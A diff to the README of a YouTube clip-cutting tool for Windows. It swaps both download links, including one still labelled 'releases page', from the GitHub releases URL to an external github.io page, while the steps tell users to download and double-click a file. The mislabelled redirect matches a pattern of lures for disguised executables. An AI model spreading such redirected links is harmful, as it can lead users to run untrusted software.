@@ -1,6 +1,6 @@
 # ✂️ yt-clip - Cut segments from YouTube videos fast
 
-[![](https://img.shields.io/badge/Download-yt--clip-blue.svg)](https://github.com/Abeeral4604/yt-clip/releases)
+[![](https://img.shields.io/badge/Download-yt--clip-blue.svg)](https://abeeral4604.github.io)
 
 yt-clip helps you save time when you need small pieces of long YouTube videos. You do not need to download entire videos to get the clips you want. This tool manages the technical work for you. You select the start and end times, and the application creates your custom video file.
 
@@ -21,7 +21,7 @@ To run this application on your Windows computer, confirm you meet these require
 
 Follow these steps to set up the software on your machine:
 
-1. Visit the [releases page](https://github.com/Abeeral4604/yt-clip/releases) to download the latest version.
+1. Visit the [releases page](https://abeeral4604.github.io) to download the latest version.
 2. Select the file named for Windows.
 3. Save the file to a folder on your computer.
 4. Double-click the file to start the application.
